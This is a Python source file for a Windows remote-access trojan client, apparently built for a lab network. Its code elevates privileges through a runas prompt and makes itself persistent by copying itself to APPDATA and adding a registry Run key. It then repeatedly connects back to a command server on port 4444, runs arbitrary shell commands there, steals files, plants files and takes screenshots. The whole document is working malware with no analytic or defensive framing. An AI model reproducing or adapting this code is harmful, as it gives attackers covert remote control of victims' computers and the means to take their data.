import socket
import subprocess
import os
import time
import ctypes
import shutil
import sys
from PIL import ImageGrab
import tempfile

SERVER_IP = "192.168.30.129"
SERVER_PORT = 4444
BUFFER_SIZE = 1024

def setup_persistence():
    exe_name = "client.exe"
    target_path = os.path.join(os.environ["APPDATA"], exe_name)

    # Relaunch with admin if not elevated
    if not is_admin():
        print("[*] Not running as admin, attempting to elevate...")
        try:
            # Relaunch the script with admin privileges
            params = f'"{sys.executable}" "{__file__}"'
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit()
        except Exception as e:
            print(f"[!] Failed to elevate privileges: {e}")
            return

    if not os.path.exists(target_path):
        try:
            print(f"[DEBUG] Copying to {target_path}")
            shutil.copyfile(sys.executable, target_path)

            reg_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Client /t REG_SZ /d "{target_path}" /f'
            print(f"[DEBUG] Running: {reg_command}")
            result = subprocess.run(reg_command, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                print("[+] Persistence added to registry.")
            else:
                print(f"[!] Failed to add registry key: {result.stderr}")

        except Exception as e:
            print(f"[!] Persistence setup error: {e}")
    else:
        print("[*] Persistence already set.")


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def send_file(s, path):
    try:
        if not os.path.isfile(path):
            s.send(b"File not found__END__")
            return

        if os.path.getsize(path) == 0:
            s.send(b"File is empty__END__")
            return

        print(f"[DEBUG] Sending file: {path}")
        with open(path, 'rb') as f:
            while chunk := f.read(BUFFER_SIZE):
                print(f"[DEBUG] Chunk: {chunk[:50]}")  # print first 50 bytes
                s.send(chunk)
            s.send(b"__END__")

    except Exception as e:
        try:
            s.send(f"[!] Error sending file: {e}__END__".encode())
        except:
            pass


def receive_file(s, dest_path):
    try:
        with open(dest_path, 'wb') as f:
            buffer = b''
            while True:
                data = s.recv(BUFFER_SIZE)
                if not data:
                    break
                buffer += data
                if b"__END__" in buffer:
                    parts = buffer.split(b"__END__", 1)
                    f.write(parts[0])
                    print(f"[DEBUG] Wrote {len(parts[0])} bytes to {dest_path}")
                    break
                f.write(buffer)
                print(f"[DEBUG] Wrote {len(buffer)} bytes to {dest_path}")
                buffer = b''
        s.send(f"[+] File saved to: {dest_path}".encode())
    except Exception as e:
        try:
            s.send(f"[!] Error receiving file: {e}".encode())
        except:
            pass


def handle_commands(s):
    while True:
        try:
            cmd = s.recv(BUFFER_SIZE)

            if not cmd:
                print("[-] Server disconnected.")
                break

            cmd = cmd.decode().strip()

            if cmd == "terminate":
                s.close()
                break

            elif cmd.startswith("cd "):
                path = cmd[3:].strip()
                try:
                    os.chdir(path)
                    s.send(f"[+] Changed directory to: {os.getcwd()}".encode())
                except Exception as e:
                    s.send(f"[!] Failed to change directory: {e}".encode())

            elif cmd == "pwd":
                s.send(os.getcwd().encode())

            elif cmd == "checkPriv":
                s.send(b"[+] Admin privileges" if is_admin() else b"[!] Standard user")


            elif cmd.startswith("grab*"):
                _, filepath = cmd.split("*", 1)
                cleaned_path = filepath.strip().strip('"').strip()
                print(f"[DEBUG] Trying to send file: {cleaned_path}")
                send_file(s, cleaned_path)

            elif cmd.startswith("send*"):
                _, dest_path, filename = cmd.split("*")
                receive_file(s, os.path.join(dest_path, filename))

            elif cmd == "screencap":
                tmpdir = tempfile.mkdtemp()
                screenshot_path = os.path.join(tmpdir, "screenshot.jpg")
                ImageGrab.grab().save(screenshot_path, "JPEG")
                send_file(s, screenshot_path)
                shutil.rmtree(tmpdir)

            elif cmd.startswith("receive_file"):
                try:
                    _, dest_path = cmd.split(" ", 1)
                    dest_path = dest_path.strip('"')
                    receive_file(s, dest_path)
                    s.send(f"[+] File saved to: {dest_path}".encode())
                except Exception as e:
                    s.send(f"[!] Error receiving file: {e}".encode())

            else:
                result = subprocess.run(cmd, shell=True, capture_output=True)
                s.send(result.stdout + result.stderr)

        except Exception as e:
            try:
                s.send(f"[!] Command error: {e}".encode())
            except:
                break

def connect():
    while True:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connected.")
            handle_commands(s)
        except Exception as e:
            print(f"[-] Failed to connect: {e}")
            time.sleep(5)

def main():
    setup_persistence()
    connect()

if __name__ == "__main__":
    main()
